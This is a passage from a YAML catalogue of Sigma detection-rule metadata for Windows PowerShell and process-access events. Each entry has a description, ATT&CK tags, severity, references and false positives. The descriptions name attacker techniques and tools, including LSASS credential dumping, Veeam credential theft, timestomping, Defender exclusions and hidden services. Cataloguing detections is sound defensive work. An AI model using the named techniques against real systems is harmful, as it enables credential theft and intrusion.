    are typically not associated.

    For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation:
    Fortinet Agent Tesla April 2018) as opposed to the traditional port 443.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1571
  tags:
  - attack.command-and-control
  - attack.t1571
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1571/T1571.md#atomic-test-1---testing-usage-of-uncommonly-used-port-with-powershell
  - https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: c6438007-e081-42ce-9483-b067fbef33c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_timestomp.yml
  name: Powershell Timestomp
  description: 'Adversaries may modify file time attributes to hide new or changes
    to existing files.

    Timestomping is a technique that modifies the timestamps of a file (the modify,
    access, create, and change times), often to mimic files that are in the same folder.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.006
  tags:
  - attack.defense-evasion
  - attack.t1070.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.006/T1070.006.md
  - https://www.offensive-security.com/metasploit-unleashed/timestomp/
  false_positives:
  - Legitimate admin script
  notes: ''
- detection_id: c2993223-6da8-4b1a-88ee-668b8bf315e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_user_discovery_get_aduser.yml
  name: User Discovery And Export Via Get-ADUser Cmdlet - PowerShell
  description: Detects usage of the Get-ADUser cmdlet to collect user information
    and output it to a file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  - https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/
  false_positives:
  - Legitimate admin scripts may use the same technique, it's better to exclude specific
    computers or users who execute these commands or scripts often
  notes: ''
- detection_id: 05b3e303-faf0-4f4a-9b30-46cc13e69152
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_user_profile_tampering.yml
  name: Potential Persistence Via PowerShell User Profile Using Add-Content
  description: Detects calls to "Add-Content" cmdlet in order to modify the content
    of the user profile and potentially adding suspicious commands for persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.013
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.013
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.013/T1546.013.md
  false_positives:
  - Legitimate administration and tuning scripts that aim to add functionality to
    a user PowerShell session
  notes: ''
- detection_id: 953945c5-22fe-4a92-9f8a-a9edc1e522da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_using_set_service_to_hide_services.yml
  name: Abuse of Service Permissions to Hide Services Via Set-Service - PS
  description: Detects usage of the "Set-Service" powershell cmdlet to configure a
    new SecurityDescriptor that allows a service to be hidden from other utilities
    such as "sc.exe", "Get-Service"...etc. (Works only in powershell 7)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.011
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.011
  time_window: ''
  references:
  - https://twitter.com/Alh4zr3d/status/1580925761996828672
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
  false_positives:
  - Rare intended use of hidden services
  - Rare FP could occur due to the non linearity of the ScriptBlockText log
  notes: ''
- detection_id: 2a0a169d-cc66-43ce-9ae2-6e678e54e46a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_vbscript_registry_modification.yml
  name: Registry Modification Attempt Via VBScript - PowerShell
  description: 'Detects attempts to modify the registry using VBScript''s CreateObject("Wscript.shell")
    and RegWrite methods embedded within PowerShell scripts or commands.

    Threat actors commonly embed VBScript code within PowerShell to perform registry
    modifications, attempting to evade detection that monitors for direct registry
    access through traditional tools.

    This technique can be used for persistence, defense evasion, and privilege escalation
    by modifying registry keys without using regedit.exe, reg.exe, or PowerShell''s
    native registry cmdlets.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.005
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.execution
  - attack.t1112
  - attack.t1059.005
  time_window: ''
  references:
  - https://www.linkedin.com/posts/mauricefielenbach_livingofftheland-redteam-persistence-activity-7344801774182051843-TE00/
  - https://www.nextron-systems.com/2025/07/29/detecting-the-most-popular-mitre-persistence-method-registry-run-keys-startup-folder/
  - https://detect.fyi/hunting-fileless-malware-in-the-windows-registry-1339ccde00ad
  false_positives:
  - Some legitimate admin or install scripts may use these processes for registry
    modifications.
  notes: ''
- detection_id: 976d6e6f-a04b-4900-9713-0134a353e38b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_veeam_credential_dumping_script.yml
  name: Veeam Backup Servers Credential Dumping Script Execution
  description: Detects execution of a PowerShell script that contains calls to the
    "Veeam.Backup" class, in order to dump stored credentials.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://www.pwndefend.com/2021/02/15/retrieving-passwords-from-veeam-backup-servers/
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Administrators backup scripts (must be investigated)
  notes: ''
- detection_id: 1139d2e2-84b1-4226-b445-354492eba8ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_web_request_cmd_and_cmdlets.yml
  name: Usage Of Web Request Commands And Cmdlets - ScriptBlock
  description: Detects the use of various web request commands with commandline tools
    and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock
    logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/
  - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell
  false_positives:
  - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.
  notes: ''
- detection_id: e2812b49-bae0-4b21-b366-7c142eafcde2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_win32_nteventlogfile_usage.yml
  name: Potentially Suspicious Call To Win32_NTEventlogFile Class - PSScript
  description: Detects usage of the WMI class "Win32_NTEventlogFile" in a potentially
    suspicious way (delete, backup, change permissions, etc.) from a PowerShell script
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa394225(v=vs.85)
  false_positives:
  - Legitimate administration and backup scripts
  notes: ''
- detection_id: 91109523-17f0-4248-a800-f81d9e7c081d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_win32_product_install_msi.yml
  name: PowerShell WMI Win32_Product Install MSI
  description: Detects the execution of an MSI file using PowerShell and the WMI Win32_Product
    class
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218.007
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 03d83090-8cba-44a0-b02f-0b756a050306
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_win_api_susp_access.yml
  name: Potential WinAPI Calls Via PowerShell Scripts
  description: Detects use of WinAPI functions in PowerShell scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1106
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1106
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: c1344fa2-323b-4d2e-9176-84b4d4821c88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_win_defender_exclusions_added.yml
  name: Windows Defender Exclusions Added - PowerShell
  description: Detects modifications to the Windows Defender configuration settings
    using PowerShell to add exclusions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/windows-defender-exclusions-added-via-powershell.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 488b44e7-3781-4a71-888d-c95abfacf44d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_windows_firewall_profile_disabled.yml
  name: Windows Firewall Profile Disabled
  description: Detects when a user disables the Windows Firewall via a Profile to
    help evade defense.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/netsecurity/set-netfirewallprofile?view=windowsserver2022-ps
  - https://www.tutorialspoint.com/how-to-get-windows-firewall-profile-settings-using-powershell
  - https://web.archive.org/web/20230929023836/http://powershellhelp.space/commands/set-netfirewallrule-psv5.php
  - http://woshub.com/manage-windows-firewall-powershell/
  - https://www.elastic.co/guide/en/security/current/windows-firewall-disabled-via-powershell.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 851c506b-6b7c-4ce2-8802-c703009d03c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_winlogon_helper_dll.yml
  name: Winlogon Helper DLL
  description: 'Winlogon.exe is a Windows component responsible for actions at logon/logoff
    as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.

    Registry entries in HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\
    and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are

    used to manage additional helper programs and functionalities that support Winlogon.
    Malicious modifications to these Registry keys may cause Winlogon to

    load and execute malicious DLLs and/or executables.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.004/T1547.004.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9e07f6e7-83aa-45c6-998e-0af26efd0a85
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_wmi_persistence.yml
  name: Powershell WMI Persistence
  description: Adversaries may establish persistence and elevate privileges by executing
    malicious content triggered by a Windows Management Instrumentation (WMI) event
    subscription.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.003/T1546.003.md
  - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/persistence/Persistence.psm1#L545
  false_positives:
  - Unknown
  notes: ''
- detection_id: 09658312-bc27-4a3b-91c5-e49ab9046d1b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_wmi_unquoted_service_search.yml
  name: WMIC Unquoted Services Path Lookup - PowerShell
  description: Detects known WMI recon method to look for unquoted service paths,
    often used by pentest inside of powershell scripts attackers enum scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://github.com/nccgroup/redsnarf/blob/35949b30106ae543dc6f2bc3f1be10c6d9a8d40e/redsnarf.py
  - https://github.com/S3cur3Th1sSh1t/Creds/blob/eac23d67f7f90c7fc8e3130587d86158c22aa398/PowershellScripts/jaws-enum.ps1
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8028c2c3-e25a-46e3-827f-bbb5abf181d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_wmimplant.yml
  name: WMImplant Hack Tool
  description: Detects parameters used by WMImplant
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1059.001
  tags:
  - attack.execution
  - attack.t1047
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/FortyNorthSecurity/WMImplant
  false_positives:
  - Administrative scripts that use the same keywords.
  notes: ''
- detection_id: 504d63cb-0dba-4d02-8531-e72981aace2c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_x509enrollment.yml
  name: Suspicious X509Enrollment - Ps Script
  description: Detect use of X509Enrollment
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=42
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=41
  - https://learn.microsoft.com/en-us/dotnet/api/microsoft.hpc.scheduler.store.cx509enrollmentwebclassfactoryclass?view=hpc-sdk-5.1.6115
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 6c6c6282-7671-4fe9-a0ce-a2dcebdc342b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/powershell/powershell_script/posh_ps_xml_iex.yml
  name: Powershell XML Execute Command
  description: 'Adversaries may abuse PowerShell commands and scripts for execution.

    PowerShell is a powerful interactive command-line interface and scripting environment
    included in the Windows operating system. (Citation: TechNet PowerShell)

    Adversaries can use PowerShell to perform a number of actions, including discovery
    of information and execution of code

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-8---powershell-xml-requests
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: 3b4b232a-af90-427c-a22f-30b0c0837b95
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_cmstp_execution_by_access.yml
  name: CMSTP Execution Process Access
  description: Detects various indicators of Microsoft Connection Manager Profile
    Installer execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.003
  - T1559.001
  tags:
  - attack.defense-evasion
  - attack.t1218.003
  - attack.execution
  - attack.t1559.001
  - attack.g0069
  - attack.g0080
  - car.2019-04-001
  time_window: ''
  references:
  - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/
  false_positives:
  - Legitimate CMSTP use (unlikely in modern enterprise environments)
  notes: ''
- detection_id: 09706624-b7f6-455d-9d02-adee024cee1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_hktl_cobaltstrike_bof_injection_pattern.yml
  name: HackTool - CobaltStrike BOF Injection Pattern
  description: Detects a typical pattern of a CobaltStrike BOF which inject into other
    processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1106
  - T1562.001
  tags:
  - attack.execution
  - attack.t1106
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/boku7/injectAmsiBypass
  - https://github.com/boku7/spawn
  false_positives:
  - Unknown
  notes: ''
- detection_id: d0d2f720-d14f-448d-8242-51ff396a334e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_hktl_generic_access.yml
  name: HackTool - Generic Process Access
  description: Detects process access requests from hacktool processes based on their
    default image name
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  time_window: ''
  references:
  - https://jsecurity101.medium.com/bypassing-access-mask-auditing-strategies-480fb641c158
  - https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b1bd3a59-c1fd-4860-9f40-4dd161a7d1f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_hktl_handlekatz_lsass_access.yml
  name: HackTool - HandleKatz Duplicating LSASS Handle
  description: Detects HandleKatz opening LSASS to duplicate its handle to later dump
    the memory without opening any new handles
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1003.001
  - T1106
  tags:
  - attack.execution
  - attack.t1106
  - attack.defense-evasion
  - attack.t1003.001
  - attack.credential-access
  time_window: ''
  references:
  - https://github.com/codewhitesec/HandleKatz
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7bdde3bf-2a42-4c39-aa31-a92b3e17afac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_hktl_littlecorporal_generated_maldoc.yml
  name: HackTool - LittleCorporal Generated Maldoc Injection
  description: Detects the process injection of a LittleCorporal generated Maldoc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1055.003
  - T1204.002
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.privilege-escalation
  - attack.t1204.002
  - attack.t1055.003
  time_window: ''
  references:
  - https://github.com/connormcgarr/LittleCorporal
  false_positives:
  - Unknown
  notes: ''
- detection_id: d29ada0f-af45-4f27-8f32-f7b77c3dbc4e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_hktl_sysmonente.yml
  name: HackTool - SysmonEnte Execution
  description: Detects the use of SysmonEnte, a tool to attack the integrity of Sysmon
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://codewhitesec.blogspot.com/2022/09/attacks-on-sysmon-revisited-sysmonente.html
  - https://github.com/codewhitesec/SysmonEnte/
  - https://github.com/codewhitesec/SysmonEnte/blob/fe267690fcc799fbda15398243615a30451d9099/screens/1.png
  false_positives:
  - Unknown
  notes: ''
- detection_id: a49fa4d5-11db-418c-8473-1e014a8dd462
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml
  name: Lsass Memory Dump via Comsvcs DLL
  description: Detects adversaries leveraging the MiniDump export function from comsvcs.dll
    via rundll32 to perform a memory dump from lsass.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/shantanukhande/status/1229348874298388484
  - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9bd012ee-0dff-44d7-84a0-aa698cfd87a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_dump_keyword_image.yml
  name: LSASS Memory Access by Tool With Dump Keyword In Name
  description: Detects LSASS process access requests from a source process with the
    "dump" keyword in its image name.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  time_window: ''
  references:
  - https://twitter.com/_xpn_/status/1491557187168178176
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz
  false_positives:
  - Rare programs that contain the word dump in their name and access lsass
  notes: ''
- detection_id: 5ef9853e-4d0e-4a70-846f-a9ca37d876da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_memdump.yml
  name: Potential Credential Dumping Activity Via LSASS
  description: 'Detects process access requests to the LSASS process with specific
    call trace calls and access masks.

    This behaviour is expressed by many credential dumping tools such as Mimikatz,
    NanoDump, Invoke-Mimikatz, Procdump and even the Taskmgr dumping feature.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0002
  time_window: ''
  references:
  - https://web.archive.org/web/20230329170326/https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html
  - https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.001/T1003.001.md
  - https://research.splunk.com/endpoint/windows_possible_credential_dumping/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f8be3e82-46a3-4e4e-ada5-8e538ae8b9c9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_python_based_tool.yml
  name: Credential Dumping Activity By Python Based Tool
  description: Detects LSASS process access for potential credential dumping by a
    Python-like tool such as LaZagne or Pypykatz.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0349
  time_window: ''
  references:
  - https://twitter.com/bh4b3sh/status/1303674603819081728
  - https://github.com/skelsec/pypykatz
  false_positives:
  - Unknown
  notes: ''
- detection_id: aa35a627-33fb-4d04-a165-d33b4afca3e8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_remote_access_trough_winrm.yml
  name: Remote LSASS Process Access Through Windows Remote Management
  description: Detects remote access to the LSASS process via WinRM. This could be
    a sign of credential dumping from tools like mimikatz.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1003.001
  - T1021.006
  - T1059.001
  tags:
  - attack.credential-access
  - attack.execution
  - attack.t1003.001
  - attack.t1059.001
  - attack.lateral-movement
  - attack.t1021.006
  - attack.s0002
  time_window: ''
  references:
  - https://pentestlab.blog/2018/05/15/lateral-movement-winrm/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 472159c5-31b9-4f56-b794-b766faa8b0a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_access/proc_access_win_lsass_seclogon_access.yml
  name: Suspicious LSASS Access Via MalSecLogon
  description: Detects suspicious access to LSASS handle via a call trace to "seclogon.dll"
    with a suspicious access right.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
